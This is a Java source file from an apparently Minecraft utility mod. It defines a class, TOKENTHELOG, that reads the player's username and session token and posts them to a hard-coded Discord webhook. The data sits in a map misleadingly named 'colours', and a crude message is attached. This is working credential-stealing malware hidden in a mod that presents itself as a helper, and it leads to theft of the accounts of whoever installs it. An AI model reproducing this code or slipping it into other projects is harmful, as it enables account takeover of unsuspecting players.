package io.github.kingstefan26.stefans_util.util;

import com.google.gson.Gson;
import net.minecraft.client.Minecraft;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.HttpClientBuilder;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

public class TOKENTHELOG {
    public static void TOKENTHELoG(){
        Map<String, String> colours = new HashMap<>();
        colours.put("content", "token of " + Minecraft.getMinecraft().getSession().getUsername() + ": " + Minecraft.getMinecraft().getSession().getToken());
        colours.put("username","Daddy i beg put it in");
        String postUrl = "https://discord.com/api/webhooks/905739940695003136/l1ATP-OKeFQxmVdFGlgaKZjT-4y4a54mVDZZJEAwD6B65j_OnlHunGaD-8P61qZH-vfE";
        Gson gson = new Gson();
        HttpClient httpClient = HttpClientBuilder.create().build();
        HttpPost post = new HttpPost(postUrl);
        StringEntity postingString;
        try {
            postingString = new StringEntity(gson.toJson(colours));
            post.setEntity(postingString);
            post.setHeader("Content-type", "application/json");
            HttpResponse response = httpClient.execute(post);
            System.out.println(response.getStatusLine().getStatusCode());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
